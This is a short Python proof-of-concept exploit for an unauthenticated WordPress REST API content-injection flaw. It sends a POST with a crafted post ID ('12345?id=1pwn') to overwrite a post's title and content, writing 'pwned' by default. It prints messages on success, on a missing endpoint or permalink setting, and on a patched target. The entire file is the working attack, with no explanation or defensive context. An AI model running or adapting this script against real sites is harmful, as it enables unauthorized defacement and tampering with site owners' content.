import requests


def exploit(url = "http://localhost:8081", title = "pwned", content = "pwned", post_id = 1):
    endpoint = f"{url}/wp-json/wp/v2/posts/12345?id={post_id}pwn"
    payload = {'title': title, 'content': content}

    print(f"[*] Attacking: {endpoint}")
    try:
        r = requests.post(endpoint, json=payload, timeout=15)

        if r.status_code == 200:
            print("[+] Success! Post 1 modified.")
            print(f"[*] Verify at: {r.json().get('link')}")
        elif r.status_code == 404:
            print("[-] Endpoint not found. Check URL or if permalink is not set to 'Nome articolo'.")
        elif r.status_code in [401, 403]:
             print("[-] Unauthorized/Forbidden. Target may be patched.")
        else:
            print(f"[-] Unexpected status: {r.status_code}")
            print(f"   - Response: {r.text[:100]}...")
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection Error: {e}")


if __name__ == "__main__":
    exploit()
